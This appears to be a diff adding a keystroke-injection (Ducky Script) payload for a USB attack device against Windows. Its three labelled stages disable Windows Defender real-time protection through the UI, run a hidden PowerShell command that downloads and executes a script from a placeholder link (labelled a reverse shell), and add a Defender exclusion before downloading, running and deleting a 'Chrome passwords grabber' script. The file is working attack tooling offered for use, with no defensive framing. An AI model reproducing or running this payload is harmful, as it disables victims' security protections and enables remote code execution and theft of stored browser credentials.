@@ -1,0 +1,97 @@
+                REM ***************************************
+REM *                                     *
+REM *    WINDOWS DEFENDER DISABLER        *
+REM *                                     *
+REM ***************************************                
+DELAY 1000
+GUI 
+DELAY 500
+STRING virus & threat protection
+ENTER
+DELAY 3000
+TAB 
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE 
+DELAY 3000
+ALT y
+DELAY 4000
+REM ***************************************
+REM *                                     *
+REM *    POWERSHELL REVERSE SHELL         *
+REM *                                     *
+REM ***************************************
+DELAY 1000
+CTRL ESC
+DELAY 300
+STRING windows security
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
+GUI r
+DELAY 600
+STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('LINK HERE');
+ENTER
+DELAY 600
+LEFT ENTER
+REM ***************************************
+REM *                                     *
+REM *    CHROME PASSWORDS GRABBER         *
+REM *                                     *
+REM ***************************************
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING start-process PowerShell -verb runas
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 1000
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 100
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING (New-Object System.Net.WebClient).DownloadFile("CHROME.PS1 LINK HERE","$env:USERPROFILE\Chrome.ps1")
+ENTER
+DELAY 2000
+STRING ./Chrome.ps1
+ENTER
+DELAY 5000
+STRING del Chrome.ps1
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1000
